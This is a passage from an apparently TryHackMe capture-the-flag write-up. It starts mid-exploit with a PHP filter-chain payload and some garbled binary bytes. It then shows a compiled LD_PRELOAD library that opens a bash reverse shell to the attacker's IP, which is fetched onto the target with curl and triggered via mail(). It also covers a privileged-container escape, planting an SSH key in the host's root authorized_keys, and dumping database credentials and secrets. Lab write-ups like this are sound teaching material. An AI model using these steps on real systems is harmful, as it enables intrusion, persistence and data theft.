-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp(1) : eval()'d code</b> on line <b>1</b><br />

code> echo ini_get('disable_functions');
exec, system, popen, proc_open, proc_nice, shell_exec, passthru, dl, pcntl_alarm, pcntl_async_signals, pcntl_errno, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_rfork, pcntl_setpriority, pcntl_signal_dispatch, pcntl_signal_get_handler, pcntl_signal, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_unshare, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig²B”0øôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@
code> $ch = curl_init('http://10.8.95.134/shell.so');curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);file_put_contents('/tmp/shell.so', curl_exec($ch)); curl_close($ch);
²B”0øôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@CàÐÐøôô>==€@
code> putenv('LD_PRELOAD=/tmp/shell.so'); mail('a','a','a','a');
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 534, in _make_request                                                                               
    response = conn.getresponse()
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 516, in getresponse                                                                                     
    httplib_response = super().getresponse()
  File "/usr/lib/python3.13/http/client.py", line 1430, in getresponse
    response.begin()
    ~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/http/client.py", line 331, in begin
    version, status, reason = self._read_status()
                              ~~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/http/client.py", line 292, in _read_status
    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
               ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/socket.py", line 719, in readinto
    return self._sock.recv_into(b)
           ~~~~~~~~~~~~~~~~~~~~^^^
TimeoutError: timed out
.....
```

shell

```jsx
└─$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  system("bash -c \"bash -i >& /dev/tcp/10.8.95.134/4444 0>&1\"");
}

```

Compiling it:

```jsx
$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Serving it via a simple HTTP server:

```jsx
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now, using the PHP code execution to download the library onto the target:

```jsx
$ python3 execute_code.py
code> $ch = curl_init('http://10.14.101.76/shell.so');curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);file_put_contents('/tmp/shell.so', curl_exec($ch)); curl_close($ch);
```

We can see the library being downloaded from our server:

```jsx
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.152.169 - - [27/Apr/2025 13:47:10] "GET /shell.so HTTP/1.1" 200 -
```

Now, setting the `LD_PRELOAD` environment variable with the `putenv` function to the library we uploaded, and calling the `mail` function to run the `sendmail` program, causing our library to be loaded and executed:

```jsx
code> putenv('LD_PRELOAD=/tmp/shell.so'); mail('a','a','a','a');
```

With this, we can see that our reverse shell payload is executed, and we get a shell as the `www-data` user inside a container:

```jsx
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.152.169] 46126
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bb28d5969dd5:/var/www/html$ script -qc /bin/bash /dev/null
www-data@bb28d5969dd5:/var/www/html$ ^Z

$ stty raw -echo; fg

www-data@bb28d5969dd5:/var/www/html$ export TERM=xterm
www-data@bb28d5969dd5:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
```

![Screenshot From 2025-05-01 06-55-00.png](img9.png)

## Privilege Escalation

## User Flag

### Container Escape

Checking the `sudo` privileges for the `www-data` user inside the container reveals full access:

```jsx
www-data@bb28d5969dd5:/var/www/html$ sudo -l
Matching Defaults entries for www-data on bb28d5969dd5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on bb28d5969dd5:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: ALL
```

Escalating to `root` inside the container:

```jsx
www-data@bb28d5969dd5:/var/www/html$ sudo su -
root@bb28d5969dd5:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Next, we inspect the effective capabilities of the container:

```jsx
root@bb28d5969dd5:~# grep CapEff /proc/self/status
CapEff: 000001ffffffffff
```

Decoding this value confirms the container holds many capabilities:

```jsx
$ capsh --decode=000001ffffffffff
0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
```

With these capabilities, there are many ways to escape the container. However, one of the simplest methods would be to mount the host’s root filesystem since we have direct access to the host’s block devices:

```jsx
root@bb28d5969dd5:~# mount /dev/nvme0n1p1 /mnt
root@bb28d5969dd5:~# cat /mnt/etc/hostname
ubuntu-jammy
```

To convert this filesystem access into a shell, we can add an SSH public key to the host’s `/root/.ssh/authorized_keys`. First, generating a key pair:

```jsx
$ ssh-keygen -f id_ed25519 -t ed25519
...
$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0nYk5JDOsXnmkB8tQOOspf8I5Ubr2sBLtnXUFq4RMP kali@kali
```

Writing the public key to `/mnt/root/.ssh/authorized_keys` (`/root/.ssh/authorized_keys` on the host):

```jsx
root@bb28d5969dd5:~# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0nYk5JDOsXnmkB8tQOOspf8I5Ubr2sBLtnXUFq4RMP kali@kali' >> /mnt/root/.ssh/authorized_keys
```

Now, we can use the private key with SSH to get a shell as the `root` user on the host and read the user flag at `/root/user.txt`.

```jsx
$ ssh -i id_ed25519 root@10.10.152.169

root@ubuntu-jammy:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-jammy:~# wc -c /root/user.txt
38 /root/user.txt
```

## Root Flag

### MySQL Database

From the `dbconfig.php` file, we already knew that the database was running on another host (`db`). Checking the `docker-compose.yml` at `/root/challenge/docker-compose.yml`, we can see it is another container:

```jsx
root@ubuntu-jammy:~/challenge# cat docker-compose.yml; echo
version: '3'

services:
  web:
    platform: linux/amd64
    build: ./web
    ports:
      - "80:80"
    restart: always
    privileged: true
  db:
    image: mariadb:10.11.11-jammy
    volumes:
      - "./db:/docker-entrypoint-initdb.d:ro"
    env_file:
      - ./db/db.env
    restart: always
```

From the `/root/challenge/db/db.env` file, we can get the `root` password for the **MySQL** server:

```jsx
root@ubuntu-jammy:~/challenge# cat db/db.env; echo
MYSQL_PASSWORD=TAJnF6YuIot83X3g
MYSQL_DATABASE=web
MYSQL_USER=web
MYSQL_ROOT_PASSWORD=gG4i8NFNkcHBwUpd
```

Listing the running containers, we can find the container running the database:

```jsx
root@ubuntu-jammy:~/challenge# docker container ls
CONTAINER ID   IMAGE                    COMMAND                  CREATED       STATUS       PORTS                                 NAMES
89366d62e05c   mariadb:10.11.11-jammy   "docker-entrypoint.s…"   7 weeks ago   Up 4 hours   3306/tcp                              challenge-db-1
bb28d5969dd5   challenge-web            "docker-php-entrypoi…"   7 weeks ago   Up 4 hours   0.0.0.0:80->80/tcp, [::]:80->80/tcp   challenge-web-1
```

We can get a shell inside the database container as follows:

```jsx
root@ubuntu-jammy:~/challenge# docker container exec -it 8936 bash
```

Connecting to the database with the password we discovered in the `db.env` file and checking the databases, we can see that, apart from the `web` database we already had access to, we have access to one more database: `secret`.

```jsx
root@89366d62e05c:/# mysql -u root -pgG4i8NFNkcHBwUpd
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| secret             |
| sys                |
| web                |
+--------------------+
6 rows in set (0.004 sec)
```

Checking the tables for the `secret` database, there is one table: `secrets`.

```jsx
MariaDB [(none)]> use secret;
MariaDB [secret]> show tables;
+------------------+
| Tables_in_secret |
+------------------+
| secrets          |
+------------------+
1 row in set (0.000 sec)
```

Finally, fetching everything from the `secrets` table, we can discover the root flag and complete the room.

```jsx
MariaDB [secret]> select * from secrets;
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| THM{[REDACTED]}                       |
+---------------------------------------+
1 row in set (0.000 sec)
```

## Lateral Movement
<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
